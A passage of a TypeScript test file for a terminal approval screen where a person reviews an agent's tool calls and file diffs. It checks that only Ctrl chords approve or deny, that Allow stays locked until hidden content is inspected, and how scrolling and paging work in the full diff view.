      expect(reviewOffersAlways(last, lastPage, true), 'content above the page is not shown').toBe(
        false,
      );
    });
  });
});

// D64 round 2, D2: the lock must not wait for an acknowledged frame — the first frame (and the first frame after a
// resize that shortens the target) is drawn before the state has recorded anything.
describe('a shortened target locks Allow from the first frame (D2)', () => {
  const unacknowledged = () =>
    initialToolReview(
      'approval',
      'first-frame',
      createReviewDocument({ kind: 'operation', target: 'd'.repeat(200), fields: [] }),
    );

  it('reads the lock from the page it is drawing, before any frame has been acknowledged', () => {
    const state = unacknowledged();
    const page = toolReviewPage(state, 80, 24);
    expect(state.requiredTarget, 'nothing has been acknowledged yet').toBeUndefined();
    expect(page?.requiredTarget).toEqual({ field: 0, start: 0, end: 200 });
    expect(reviewInspected(state, page?.requiredTarget)).toBe(false);
    expect(reduceToolReviewKey(state, 'y', CTRL, true, page, true, 0)).toEqual({ kind: 'none' });
    expect(reduceToolReviewKey(state, 'g', CTRL, true, page, true, 0)).toEqual({ kind: 'none' });
    expect(reduceToolReviewKey(state, 'n', CTRL, true, page, true, 0)).toEqual({ kind: 'deny' });
  });

  it('offers Allow once the whole target has been acknowledged in a frame that showed it', () => {
    const state = unacknowledged();
    const full = { ...state, screen: 'full' as const };
    const page = toolReviewPage(full, 80, 24);
    if (page === undefined) throw new Error('missing page');
    const inspected = acknowledgeToolReview(full, page);
    expect(reviewInspected(inspected, page.requiredTarget)).toBe(true);
    expect(reduceToolReviewKey(inspected, 'y', CTRL, true, page, true, 0)).toEqual({
      kind: 'approve',
      scope: 'once',
    });
  });
});

// PR #99 security sitting H1/H3: Enter confirms the session-wide grant only where nothing else owns it, and text typed into a
// text field is typing. The store decides the rest (the question must be open, the key on time); these are the state predicates.
describe('Enter as the confirmation and text entry as typing (H1, H3)', () => {
  const approval = (patch: Partial<ReturnType<typeof initialToolReview>> = {}) => ({
    ...initialToolReview(
      'approval',
      'call',
      createReviewDocument(editedFilePreview(8, { 4: 'four' })),
    ),
    ...patch,
  });
  const ENTER = { return: true } as const;

  it('is Enter on the card and on the full view of an approval, and only Enter', () => {
    expect(isAlwaysConfirmKey(approval(), ENTER)).toBe(true);
    expect(isAlwaysConfirmKey(approval({ screen: 'full' }), ENTER)).toBe(true);
    for (const key of [
      {},
      { escape: true },
      { tab: true },
      { downArrow: true },
      { backspace: true },
    ])
      expect(isAlwaysConfirmKey(approval(), key), JSON.stringify(key)).toBe(false);
  });

  it('is not Enter where a text field or a list owns it: the reason box denies, the search submits, the list selects', () => {
    expect(isAlwaysConfirmKey(approval({ denial: '' }), ENTER), 'reason box').toBe(false);
    expect(isAlwaysConfirmKey(approval({ denial: 'because' }), ENTER), 'reason box with text').toBe(
      false,
    );
    expect(
      isAlwaysConfirmKey(approval({ screen: 'full', searching: true, query: '' }), ENTER),
    ).toBe(false);
    expect(isAlwaysConfirmKey(approval({ screen: 'list' }), ENTER), 'list').toBe(false);
    expect(isAlwaysConfirmKey({ ...approval(), kind: 'details' }, ENTER), 'details').toBe(false);
  });

  it('is not a modified Enter', () => {
    expect(isAlwaysConfirmKey(approval(), { return: true, ctrl: true })).toBe(false);
    expect(isAlwaysConfirmKey(approval(), { return: true, meta: true })).toBe(false);
  });

  it('the reducer still gives Enter its text-field meaning: it denies in the reason box and submits a search', () => {
    const state = approval({ denial: 'no thanks' });
    expect(reduceToolReviewKey(state, '', ENTER, true, undefined, true, 0)).toEqual({
      kind: 'deny',
      reason: 'no thanks',
    });
    const searching = approval({ screen: 'full', searching: true, query: 'four' });
    const action = reduceToolReviewKey(searching, '', ENTER, true, undefined, true, 0);
    expect(action.kind).toBe('state');
    expect(action.kind === 'state' && action.state.searching).toBe(false);
  });

  it('typing is the reason box and the search query, nothing else', () => {
    expect(isTypingIntoReview(approval({ denial: '' }))).toBe(true);
    expect(isTypingIntoReview(approval({ screen: 'full', searching: true, query: '' }))).toBe(true);
    expect(isTypingIntoReview(approval())).toBe(false);
    expect(isTypingIntoReview(approval({ screen: 'full' }))).toBe(false);
  });
});

// PR #99: every key that ANSWERS an approval card is a Ctrl chord. While a turn runs the person is often typing the next
// instruction, and a bare letter typed at a card that has just appeared is indistinguishable from a deliberate answer —
// "yes do it" would approve a write with its `y`. The chord is what makes a key an answer; a bare letter is typing.
describe('reviewAnswerKey — the answer keys are Ctrl chords, never a bare letter', () => {
  const PRINTABLE = Array.from({ length: 0x7f - 0x20 }, (_, index) =>
    String.fromCharCode(0x20 + index),
  );

  it('maps Ctrl+Y to allow, Ctrl+G to always, Ctrl+N to deny and Ctrl+R to reason', () => {
    expect(reviewAnswerKey('y', CTRL)).toBe('allow');
    expect(reviewAnswerKey('g', CTRL)).toBe('always');
    expect(reviewAnswerKey('n', CTRL)).toBe('deny');
    expect(reviewAnswerKey('r', CTRL)).toBe('reason');
  });

  it('answers nothing for a bare printable character — not y, g, n, r, a, c, a digit or an upper-case letter', () => {
    for (const input of PRINTABLE)
      expect(reviewAnswerKey(input, {}), JSON.stringify(input)).toBeUndefined();
    // The old single-letter answers and the old digit shortcuts, named, so a regression reads as what it is.
    for (const input of ['y', 'a', 'n', 'c', 'r', 'g', '1', '2', '3', 'Y', 'A', 'N'])
      expect(reviewAnswerKey(input, {}), input).toBeUndefined();
  });

  it('answers nothing for a Ctrl+Alt (meta) chord, nor for Alt alone', () => {
    for (const input of ['y', 'g', 'n', 'r']) {
      expect(
        reviewAnswerKey(input, { ctrl: true, meta: true }),
        `ctrl+meta ${input}`,
      ).toBeUndefined();
      expect(reviewAnswerKey(input, { meta: true }), `meta ${input}`).toBeUndefined();
    }
  });

  it('answers nothing for any other Ctrl letter or character (Ctrl+A/E/S/T/W/Z and the rest)', () => {
    for (const input of PRINTABLE) {
      if ('ygnr'.includes(input)) continue;
      expect(reviewAnswerKey(input, CTRL), `ctrl+${JSON.stringify(input)}`).toBeUndefined();
    }
    for (const input of ['a', 'e', 's', 't', 'w', 'z', 'c'])
      expect(reviewAnswerKey(input, CTRL), `ctrl+${input}`).toBeUndefined();
    // Only the exact one-letter chord Ink derives from the control byte: nothing empty, coalesced or upper-case.
    for (const input of ['', 'yy', 'ny', 'Y', 'N', 'G', 'R'])
      expect(reviewAnswerKey(input, CTRL), JSON.stringify(input)).toBeUndefined();
  });
});

describe('reduceToolReviewKey — an approval is answered by a Ctrl chord only', () => {
  const small = () => editedFilePreview(8, { 4: 'four' });
  /** An approval card whose frame has been acknowledged: Allow is unlocked and the whole change is on the page. */
  const answerable = (
    preview: ToolPreview = small(),
    patch: Partial<ReturnType<typeof initialToolReview>> = {},
  ) => {
    const base = {
      ...initialToolReview('approval', 'call', createReviewDocument(preview)),
      ...patch,
    };
    const drawn = toolReviewPage(base, 80, 24);
    // The call list draws no page at all; every other screen does.
    if (drawn === undefined && base.screen !== 'list') throw new Error('missing page');
    return { state: drawn === undefined ? base : acknowledgeToolReview(base, drawn), page: drawn };
  };
  const press = (
    { state, page }: ReturnType<typeof answerable>,
    input: string,
    key: Parameters<typeof reduceToolReviewKey>[2],
    { visible = true, cacheable = true } = {},
  ) => reduceToolReviewKey(state, input, key, visible, page, cacheable, 0);

  it('Ctrl+Y approves once on a visible, inspected card', () => {
    expect(press(answerable(), 'y', CTRL)).toEqual({ kind: 'approve', scope: 'once' });
  });

  it('Ctrl+Y needs the visible frame and an unlocked Allow', () => {
    expect(press(answerable(), 'y', CTRL, { visible: false })).toEqual({ kind: 'none' });
    // A target the card shortens locks Allow until the whole target has been inspected in the full view.
    const locked = answerable({ kind: 'operation', target: 'd'.repeat(200), fields: [] });
    expect(press(locked, 'y', CTRL)).toEqual({ kind: 'none' });
  });

  it('Ctrl+G approves always — and only when the card offers it (cacheable, and the page shows everything it grants)', () => {
    const whole = answerable();
    expect(reviewOffersAlways(whole.state, whole.page, true)).toBe(true);
    expect(press(whole, 'g', CTRL)).toEqual({ kind: 'approve', scope: 'always' });
    // Not cacheable: the call may not be remembered, so the chord answers nothing — while Ctrl+Y still allows it once.
    expect(press(whole, 'g', CTRL, { cacheable: false })).toEqual({ kind: 'none' });
    expect(press(whole, 'y', CTRL, { cacheable: false })).toEqual({
      kind: 'approve',
      scope: 'once',
    });
    // A change the card cannot draw: the session-wide grant would cover lines the person never saw.
    const partial = answerable(editedFilePreview(100, { 5: 'five', 90: 'EVIL' }));
    expect(partial.page?.hiddenChanges).toBeGreaterThan(0);
    expect(reviewOffersAlways(partial.state, partial.page, true)).toBe(false);
    expect(press(partial, 'g', CTRL)).toEqual({ kind: 'none' });
    expect(press(partial, 'y', CTRL)).toEqual({ kind: 'approve', scope: 'once' });
    // And not on a frame that is not visible.
    expect(press(whole, 'g', CTRL, { visible: false })).toEqual({ kind: 'none' });
  });

  it('Ctrl+N denies — even when the frame is not visible and the review is not inspected', () => {
    expect(press(answerable(), 'n', CTRL)).toEqual({ kind: 'deny' });
    expect(press(answerable(), 'n', CTRL, { visible: false })).toEqual({ kind: 'deny' });
    const unreadable = {
      state: initialToolReview('approval', 'call', createReviewDocument(small())),
      page: undefined,
    };
    expect(press(unreadable, 'n', CTRL, { visible: false })).toEqual({ kind: 'deny' });
  });

  it('Ctrl+R opens the reason box on the card screen — and does nothing on the full screen', () => {
    const card = answerable();
    const opened = press(card, 'r', CTRL);
    expect(opened.kind).toBe('state');
    expect(opened.kind === 'state' && opened.state.denial).toBe('');
    // On the full view a bare `r` reveals masked text and a chord is not a reveal: no state change at all.
    const onFull = answerable(small(), { screen: 'full' });
    expect(press(onFull, 'r', CTRL)).toEqual({ kind: 'none' });
  });

  it('a bare letter answers nothing — not y, g, n, r, a, c, a digit, upper-case — on a visible, inspected card', () => {
    const card = answerable();
    for (const input of ['y', 'g', 'n', 'r', 'a', 'c', '1', '2', '3', 'Y', 'A', 'N'])
      expect(press(card, input, {}), input).toEqual({ kind: 'none' });
  });

  it('every bare printable ASCII character is `none` on the card, except `v`, which opens the full view', () => {
    const card = answerable();
    // Space (0x20) to `~` (0x7e): all of them, inspected and visible, with every answer unlocked. A `y` that approved, an
    // `n` that denied, a `c` that opened the reason box, a `/` that opened a search would each fail here.
    const result = new Map<string, string>();
    for (let code = 0x20; code < 0x7f; code++) {
      const input = String.fromCharCode(code);
      const action = press(card, input, {});
      result.set(input, action.kind);
      if (input === 'v') {
        expect(action).toMatchObject({ kind: 'state', state: { screen: 'full' } });
      } else {
        expect(action, JSON.stringify(input)).toEqual({ kind: 'none' });
      }
    }
    expect(result.get('v')).toBe('state');
    expect([...result.entries()].filter(([, kind]) => kind !== 'none')).toEqual([['v', 'state']]);
  });

  it('every bare printable ASCII character is `none` on the full view too, apart from its inspection keys', () => {
    // The full view keeps its own bare navigation/inspection keys (reveal, numeric, search, copy, back); none of them is an
    // answer. What must never come out of ANY bare character is an `approve`, a `deny` or a reason box.
    const full = answerable(small(), { screen: 'full' });
    for (let code = 0x20; code < 0x7f; code++) {
      const input = String.fromCharCode(code);
      const action = press(full, input, {});
      expect(['approve', 'deny'], JSON.stringify(input)).not.toContain(action.kind);
      if (action.kind === 'state')
        expect(action.state.denial, JSON.stringify(input)).toBeUndefined();
    }
  });

  it('a chord is not an answer where something else owns the keyboard: the reason box, the search box, the call list, a details view', () => {
    const chords = ['y', 'g', 'n', 'r'];
    const owned: ReadonlyArray<readonly [string, ReturnType<typeof answerable>]> = [
      ['the reason box', answerable(small(), { denial: '' })],
      ['the reason box with text', answerable(small(), { denial: 'because' })],
      ['the search box', answerable(small(), { screen: 'full', searching: true, query: 'f' })],
      ['the call list', answerable(small(), { screen: 'list' })],
      [
        'a details view',
        {
          ...answerable(),
          state: { ...answerable().state, kind: 'details' as const },
        },
      ],
    ];
    for (const [name, review] of owned)
      for (const input of chords)
        for (const visible of [true, false])
          expect(press(review, input, CTRL, { visible }), `${name}: ctrl+${input}`).toEqual({
            kind: 'none',
          });
  });

  it('Ctrl+Alt (meta) never answers: Ctrl+Meta+Y/G/N/R and Alt+Y/G/N/R are all `none`', () => {
    const card = answerable();
    for (const input of ['y', 'g', 'n', 'r']) {
      expect(press(card, input, { ctrl: true, meta: true }), `ctrl+meta+${input}`).toEqual({
        kind: 'none',
      });
      expect(press(card, input, { meta: true }), `meta+${input}`).toEqual({ kind: 'none' });
    }
  });

  it('a Ctrl chord that is not an answer (Ctrl+A/E/S/T/W/Z) does nothing', () => {
    const card = answerable();
    for (const input of ['a', 'e', 's', 't', 'w', 'z'])
      expect(press(card, input, CTRL), `ctrl+${input}`).toEqual({ kind: 'none' });
  });

  it('Esc and Ctrl+C stop the turn at the card — they are not answers, and they win over every other rule (ADR-0115 §2)', () => {
    const card = answerable();
    expect(press(card, '', { escape: true })).toEqual({ kind: 'abort' });
    expect(press(card, 'c', CTRL)).toEqual({ kind: 'abort' });
    // The full view and the call list have their own way back (`[b]`); Esc there is still the stop key.
    for (const screen of ['full', 'list'] as const) {
      expect(press(answerable(small(), { screen }), '', { escape: true }), screen).toEqual({
        kind: 'abort',
      });
      expect(press(answerable(small(), { screen }), 'c', CTRL), `${screen} Ctrl+C`).toEqual({
        kind: 'abort',
      });
    }
    // The interrupt matcher is shared with every card: either case of the letter is the same key, and Alt+C is not an interrupt.
    expect(press(card, 'C', CTRL)).toEqual({ kind: 'abort' });
    expect(press(card, 'c', { ctrl: true, meta: true })).toEqual({ kind: 'none' });
  });

  it('Ctrl+C stops even inside a text box: it is the stop key everywhere, Esc is the one that steps back (ADR-0115 §3)', () => {
    expect(press(answerable(small(), { denial: 'x' }), 'c', CTRL)).toEqual({ kind: 'abort' });
    expect(press(answerable(small(), { searching: true, query: 'q' }), 'c', CTRL)).toEqual({
      kind: 'abort',
    });
  });

  it('Esc inside the reason box closes the box, discards what was typed and leaves the call pending', () => {
    const boxed = answerable(small(), { denial: 'because', message: 'old note' });
    const result = press(boxed, '', { escape: true });
    expect(result.kind).toBe('state');
    if (result.kind !== 'state') return;
    expect(result.state.denial).toBeUndefined();
    expect(result.state.message).toBe('');
    expect(result.state.kind).toBe('approval'); // still an approval review: nothing was rejected, nothing aborted
    // A second Esc, with no box open, now rejects and stops.
    expect(press({ state: result.state, page: undefined }, '', { escape: true })).toEqual({
      kind: 'abort',
    });
  });

  it("Esc inside the full view's search box closes the box and keeps the full view", () => {
    const searching = answerable(small(), { screen: 'full', searching: true, query: 'needle' });
    const result = press(searching, '', { escape: true });
    expect(result.kind).toBe('state');
    if (result.kind !== 'state') return;
    expect(result.state.searching).toBe(false);
    expect(result.state.query).toBeUndefined();
    expect(result.state.screen).toBe('full');
    expect(press({ state: result.state, page: undefined }, '', { escape: true })).toEqual({
      kind: 'abort',
    });
  });

  it('Esc closes a details view as it always did, a search box included (a details view is not an approval)', () => {
    const details = { state: initialToolReview('details', 'call'), page: undefined };
    expect(press(details, '', { escape: true })).toEqual({ kind: 'close' });
    expect(
      press({ ...details, state: { ...details.state, searching: true } }, '', { escape: true }),
    ).toEqual({ kind: 'close' });
    expect(press(details, 'c', CTRL)).toEqual({ kind: 'close' });
  });
});

describe('isAffirmativeReviewKey — only the Ctrl+Y / Ctrl+G chords are affirmative; a bare letter is a foreign key', () => {
  const card = () =>
    initialToolReview(
      'approval',
      'call',
      createReviewDocument(editedFilePreview(8, { 4: 'four' })),
    );

  it('is true for Ctrl+Y and Ctrl+G on an approval card or full view', () => {
    for (const state of [card(), { ...card(), screen: 'full' as const }]) {
      expect(isAffirmativeReviewKey(state, 'y', CTRL)).toBe(true);
      expect(isAffirmativeReviewKey(state, 'g', CTRL)).toBe(true);
    }
  });

  it('is false for a bare letter or digit, a Ctrl+Alt chord, and the non-affirmative chords (Ctrl+N, Ctrl+R)', () => {
    for (const input of ['y', 'a', 'g', 'n', 'r', 'c', '1', '2', '3', 'Y'])
      expect(isAffirmativeReviewKey(card(), input, {}), input).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'y', { ctrl: true, meta: true })).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'g', { ctrl: true, meta: true })).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'n', CTRL)).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'r', CTRL)).toBe(false);
  });

  it('is false wherever a text field, the call list or a details view owns the keyboard', () => {
    const state = card();
    for (const owned of [
      { ...state, denial: '' },
      { ...state, screen: 'full' as const, searching: true, query: '' },
      { ...state, screen: 'list' as const },
      { ...state, kind: 'details' as const },
    ])
      for (const input of ['y', 'g'])
        expect(isAffirmativeReviewKey(owned, input, CTRL)).toBe(false);
  });
});

// ---------------------------------------------------------------------------------------------------------------------
// ADR-0134 — the full view and the tool details are one readable inspection screen. What follows pins its motion, its
// opening, its inspection bookkeeping, its geometry and the losslessness of its deduplicated listing.
//
// Reading the fixtures: `editedFilePreview(n, edits)` gives the source lines, in this order, to the review document —
// line 0 is the target, and then each ORIGINAL line `k` takes exactly two source lines, `2k - 1` and `2k`: an unchanged
// line is its `=before k` copy then its `=k` copy; an edited line is its `-k` row then its `+k` row. The full view lists
// the `=k` copy and leaves the byte-identical `=before k` copy out (`fullSkip`), so every unchanged line is ONE listed row.
// ---------------------------------------------------------------------------------------------------------------------

const DOWN = { downArrow: true } as const;
const UP = { upArrow: true } as const;
const PGDN = { pageDown: true } as const;
const PGUP = { pageUp: true } as const;
const HOME = { home: true } as const;
const END = { end: true } as const;
const TAB = { tab: true } as const;
const SHIFT_TAB = { tab: true, shift: true } as const;

function must<T>(value: T | undefined, what: string): T {
  if (value === undefined) throw new Error(`missing ${what}`);
  return value;
}
/** An approval whose full view is open over `preview`, at the top unless `patch` says otherwise. */
const fullViewOf = (
  preview: ToolPreview,
  patch: Partial<ToolReviewState> = {},
): ToolReviewState => ({
  ...initialToolReview('approval', 'call', createReviewDocument(preview)),
  screen: 'full',
  ...patch,
});
/** The page the host hands the key reducer at 80 columns, with the default chrome allowance (12 rows → 11 body rows at 24). */
const drawnPage = (state: ToolReviewState, rows = 24): ReviewPage =>
  must(toolReviewPage(state, 80, rows), 'page');
const scrollViewOf = (state: ToolReviewState, page: ReviewPage): ScrollView => ({
  columns: page.columns,
  rowLimit: page.rowLimit,
  reveal: state.reveal,
  numeric: state.numeric,
});
/** One key on a visible frame of `state`, drawn at 80×24. */
const pressFull = (state: ToolReviewState, input: string, key: ChatKey = {}) =>
  reduceToolReviewKey(state, input, key, true, drawnPage(state), true, 0);
/** The state after a key that must have changed it. */
const stateAfter = (state: ToolReviewState, input: string, key: ChatKey = {}): ToolReviewState => {
  const action = pressFull(state, input, key);
  if (action.kind !== 'state')
    throw new Error(`${JSON.stringify(input)} ${JSON.stringify(key)} gave ${action.kind}`);
  return action.state;
};
const documentOf = (state: ToolReviewState): ReviewDocument => must(state.document, 'document');
const lineIndex = (document: ReviewDocument, label: string): number => {
  const index = document.lines.findIndex((line) => line.label === label);
  if (index < 0) throw new Error(`no line ${label}`);
  return index;
};
const labelOf = (state: ToolReviewState): string | undefined =>
  state.document?.lines[state.cursor.line]?.label;
/** The lines the full view lists, in order: what a person scrolls over (every line but a skipped before copy). */
const listingOf = (document: ReviewDocument) =>
  document.lines.flatMap((line, index) =>
    line.fullSkip === true ? [] : [{ index, label: line.label }],
  );
/** How many listed lines come before the cursor's line. */
const ordinalOf = (document: ReviewDocument, cursor: ReviewCursor): number =>
  document.lines.slice(0, cursor.line).filter((line) => line.fullSkip !== true).length;
/** The labels of the changed (removed or added) rows a page draws. */
const changedRowsOf = (page: ReviewPage): string[] =>
  page.labels.filter(
    (_, index) => page.kinds[index] === 'removed' || page.kinds[index] === 'added',
  );
interface TabLanding {
  readonly state: ToolReviewState;
  /** What the page drawn at this landing shows of the change. */
  readonly changed: readonly string[];
  /** The nearest changed line (document order, or reverse going back) no landing so far had drawn, before this key. */
  readonly nextUnseen: string | undefined;
}
interface TabWalk {
  readonly landings: readonly TabLanding[];
  /** Every changed label drawn on the start page or on some landing. */
  readonly seen: ReadonlySet<string>;
  /** What the view said when it stopped, and the page it was on when it said it. */
  readonly refusal: string;
  readonly refusedAt: ReviewPage;
  readonly last: ToolReviewState;
}
/**
 * Press Tab (or Shift+Tab) until the view stops with its note — `No later change` / `No earlier change` — recording every
 * landing and what its page draws. Terminates or throws: a key that cannot stop is a defect, not a long test.
 */
function tabWalk(start: ToolReviewState, backward = false): TabWalk {
  const key = backward ? SHIFT_TAB : TAB;
  const document = documentOf(start);
  const order = document.lines.filter((line) => line.changed).map((line) => line.label);
  if (backward) order.reverse();
  const seen = new Set(changedRowsOf(drawnPage(start)));
  const landings: TabLanding[] = [];
  let current = start;
  for (let step = 0; step < 120; step++) {
    const before = drawnPage(current);
    const action = pressFull(current, '', key);
    if (action.kind !== 'state')
      throw new Error(`${backward ? 'Shift+Tab' : 'Tab'} gave ${action.kind}`);
    if (action.state.message !== '')
      return { landings, seen, refusal: action.state.message, refusedAt: before, last: current };
    const nextUnseen = order.find((label) => !seen.has(label));
    const landed = drawnPage(action.state);
    if (!backward)
      expect(
        action.state.cursor.line,
        'a landing never passes the last full page',
      ).toBeLessThanOrEqual(lastPageStart(document, scrollViewOf(action.state, landed)).line);
    const changed = changedRowsOf(landed);
    for (const label of changed) seen.add(label);
    landings.push({ state: action.state, changed, nextUnseen });
    current = action.state;
  }
  throw new Error('Tab never stopped');
}
/** Every changed line of the document was drawn on the start page or on some landing. */
const everyChangedLineSeen = (walk: TabWalk, document: ReviewDocument): string[] =>
  document.lines
    .filter((line) => line.changed && !walk.seen.has(line.label))
    .map((line) => line.label);

/** `before` lines with the given 1-based lines replaced — `editedFilePreview` over lines the caller chooses. */
function editedLines(
  before: readonly string[],
  edits: Readonly<Record<number, string>>,
  target = 'src/app.ts',
): ToolPreview {
  const after = before.map((text, index) => edits[index + 1] ?? text);
  const sides = { before: 0, after: 0 };
  const span = (side: 'before' | 'after', line: number, text: string) => {
    const start = sides[side];
    sides[side] += text.length + 1;
    return { line, start, end: sides[side] };
  };
  const lines: ToolFileDiff['lines'][number][] = [];
  let changed = 0;
  before.forEach((text, index) => {
    const next = after[index] ?? text;
    if (next === text) {
      lines.push({
        kind: 'context',
        text,
        ending: 'lf',
        before: span('before', index + 1, text),
        after: span('after', index + 1, text),
      });
      return;
    }
    changed++;
    lines.push({ kind: 'removed', text, ending: 'lf', before: span('before', index + 1, text) });
    lines.push({ kind: 'added', text: next, ending: 'lf', after: span('after', index + 1, next) });
  });
  const bytes = (rows: readonly string[]): number => reviewBytes(`${rows.join('\n')}\n`);
  return {
    kind: 'operation',
    target,
    fields: [],
    diff: {
      before: `${before.join('\n')}\n`,
      after: `${after.join('\n')}\n`,
      beforeEndings: 'lf',
      afterEndings: 'lf',
      stats: {
        addedLines: changed,
        removedLines: changed,
        beforeBytes: bytes(before),
        afterBytes: bytes(after),
      },
      lines,
    },
  };
}

describe('the full view moves over the listed lines (ADR-0134 §5)', () => {
  /** 60 lines, three separated edits: the document has 121 source lines and 64 LISTED lines (the target, 57 unchanged, 3 × 2 changed). */
  const preview = () => editedFilePreview(60, { 10: 'ten', 30: 'thirty', 50: 'fifty' });
  const top = () => fullViewOf(preview());
  /** A cursor on the line labelled `label`, at its start. */
  const on = (label: string): Partial<ToolReviewState> => ({
    cursor: { line: lineIndex(documentOf(top()), label), offset: 0 },
  });
  const ROWS = 11; // 24 rows − 1 spare − 12 chrome

  it('opens its listing as the fixture says it does: 64 listed lines over 121 source lines, 11 body rows', () => {
    const document = documentOf(top());
    expect(document.lines).toHaveLength(121);
    expect(listingOf(document)).toHaveLength(64);
    expect(document.changeStarts).toEqual([19, 59, 99]);
    expect(drawnPage(top()).rowLimit).toBe(ROWS);
  });

  describe('Down / j and Up / k: one listed line', () => {
    it('Down moves one listed line — the skipped before copy of an unchanged line is never a stop', () => {
      let state = top();
      const document = documentOf(state);
      const stops: (string | undefined)[] = [];
      for (let step = 0; step < 4; step++) {
        const previous = state.cursor.line;
        state = stateAfter(state, '', DOWN);
        stops.push(labelOf(state));
        expect(state.cursor.offset).toBe(0);
        // The one source line between two stops is a before copy the listing leaves out.
        expect(
          document.lines
            .slice(previous + 1, state.cursor.line)
            .map((line) => [line.label.startsWith('=before'), line.fullSkip]),
        ).toEqual([[true, true]]);
      }
      expect(stops).toEqual(['=1', '=2', '=3', '=4']);
    });

    it('Down walks into, through and out of a change one row at a time, skipping the before copy after it', () => {
      let state = fullViewOf(preview(), on('=9'));
      const document = documentOf(state);
      const stops: string[] = [];
      for (let step = 0; step < 3; step++) {
        state = stateAfter(state, '', DOWN);
        stops.push(must(labelOf(state), 'label'));
      }
      expect(stops).toEqual(['-10', '+10', '=11']);
      expect(state.cursor.line, 'the before copy of line 11 sits between and is jumped over').toBe(
        lineIndex(document, '+10') + 2,
      );
    });

    it('Up walks back the same way and stops at the target, the first listed line', () => {
      let state = fullViewOf(preview(), on('=11'));
      const stops: string[] = [];
      for (let step = 0; step < 3; step++) {
        state = stateAfter(state, '', UP);
        stops.push(must(labelOf(state), 'label'));
      }
      expect(stops).toEqual(['+10', '-10', '=9']);
      let near = fullViewOf(preview(), on('=2'));
      near = stateAfter(near, '', UP);
      expect(labelOf(near)).toBe('=1');
      near = stateAfter(near, '', UP);
      expect(labelOf(near)).toBe('target');
      expect(near.cursor).toEqual({ line: 0, offset: 0 });
    });

    it('j is Down and k is Up', () => {
      const middle = fullViewOf(preview(), on('=20'));
      expect(pressFull(middle, 'j')).toEqual(pressFull(middle, '', DOWN));
      expect(pressFull(middle, 'k')).toEqual(pressFull(middle, '', UP));
      expect(stateAfter(middle, 'j').cursor.line).toBeGreaterThan(middle.cursor.line);
      expect(stateAfter(middle, 'k').cursor.line).toBeLessThan(middle.cursor.line);
    });

    it('Up and k at the first line change nothing: the action is none', () => {
      expect(pressFull(top(), '', UP)).toEqual({ kind: 'none' });
      expect(pressFull(top(), 'k')).toEqual({ kind: 'none' });
    });

    it('scrolling DOWN never passes the last full page: held Down stops exactly there, and the page then reaches the end', () => {
      let state = top();
      const document = documentOf(state);
      const total = listingOf(document).length;
      let moves = 0;
      for (let press = 0; press < 200; press++) {
        const action = pressFull(state, '', DOWN);
        if (action.kind !== 'state') break;
        expect(action.state.cursor.line, 'every press advances').toBeGreaterThan(state.cursor.line);
        state = action.state;
        moves++;
      }
      const last = drawnPage(state);
      // Fifty-three presses take the person from the top to the page that ends the listing: 64 listed lines − an 11-row page.
      expect(moves).toBe(total - ROWS);
      expect(state.cursor).toEqual(lastPageStart(document, scrollViewOf(state, last)));
      expect(state.cursor).toEqual({ line: lineIndex(document, '+50'), offset: 0 });
      expect(last.next, 'the last full page reaches the end of the document').toBeUndefined();
      expect(last.rows, 'and it is FULL: the screen never ends in blank rows').toHaveLength(ROWS);
      expect(last.rows.at(-1)).toBe('=60 line 60');
      // One more press, by either key, changes nothing.
      expect(pressFull(state, '', DOWN)).toEqual({ kind: 'none' });
      expect(pressFull(state, 'j')).toEqual({ kind: 'none' });
    });

    it('a cursor already past the last full page (a search put it there) is not pulled back by Down, and Up is not held back', () => {
      const document = documentOf(top());
      const beyond = fullViewOf(preview(), on('=57'));
      expect(beyond.cursor.line).toBeGreaterThan(
        lastPageStart(document, scrollViewOf(beyond, drawnPage(beyond))).line,
      );
      expect(pressFull(beyond, '', DOWN)).toEqual({ kind: 'none' });
      expect(labelOf(stateAfter(beyond, '', UP))).toBe('=56');
    });
  });

  describe('PgDn / Space and PgUp: one page', () => {
    it('PgDn advances exactly one page of the listing, and Space is PgDn', () => {
      const first = top();
      const listing = listingOf(documentOf(first));
      expect(drawnPage(first).labels).toEqual(listing.slice(0, ROWS).map((entry) => entry.label));
      const second = stateAfter(first, '', PGDN);
      expect(second.cursor).toEqual({ line: must(listing[ROWS], 'line').index, offset: 0 });
      expect(drawnPage(second).labels).toEqual(
        listing.slice(ROWS, 2 * ROWS).map((entry) => entry.label),
      );
      expect(pressFull(first, ' ')).toEqual(pressFull(first, '', PGDN));
    });

    it('PgDn is clamped to the last full page, and does nothing once the page reaches the end', () => {
      const document = documentOf(top());
      const listing = listingOf(document);
      // Three lines before the last page's start: a whole page further would run past the end of the document.
      const near = fullViewOf(preview(), {
        cursor: { line: must(listing[listing.length - ROWS - 3], 'line').index, offset: 0 },
      });
      expect(drawnPage(near).next, 'the page below this one is not a full page').toBeDefined();
      const landed = stateAfter(near, '', PGDN);
      expect(landed.cursor).toEqual({ line: lineIndex(document, '+50'), offset: 0 });
      expect(landed.cursor).toEqual(
        lastPageStart(document, scrollViewOf(landed, drawnPage(landed))),
      );
      expect(drawnPage(landed).next).toBeUndefined();
      expect(pressFull(landed, '', PGDN)).toEqual({ kind: 'none' });
      expect(pressFull(landed, ' ')).toEqual({ kind: 'none' });
    });

    it('PgUp goes up one page of listed lines, never past the first, and does nothing at the top', () => {
      const document = documentOf(top());
      const last = fullViewOf(preview(), on('+50'));
      const up = stateAfter(last, '', PGUP);
      expect(ordinalOf(document, up.cursor)).toBe(ordinalOf(document, last.cursor) - ROWS);
      expect(drawnPage(up).labels.at(-1), 'the page above ends where the last one began').toBe(
        listingOf(document)[ordinalOf(document, last.cursor) - 1]?.label,
      );
      // Fewer than a page from the top: it lands on the top, the target.
      const close = fullViewOf(preview(), {
        cursor: { line: must(listingOf(document)[5], 'line').index, offset: 0 },
      });
      expect(stateAfter(close, '', PGUP).cursor).toEqual({ line: 0, offset: 0 });
      expect(pressFull(top(), '', PGUP)).toEqual({ kind: 'none' });
    });

    it('a page cut inside a long line continues there, and PgUp / Up first return to the start of that line', () => {
      const long = editedFilePreview(60, { 10: 'y'.repeat(3000) });
      let state = fullViewOf(long, {
        cursor: { line: lineIndex(documentOf(fullViewOf(long)), '+10'), offset: 0 },
      });
      const lineNumber = state.cursor.line;
      const lineStart = must(documentOf(state).lines[lineNumber], 'line').start;
      const inside: ReviewCursor[] = [];
      for (let page = 0; page < 12; page++) {
        const before = drawnPage(state);
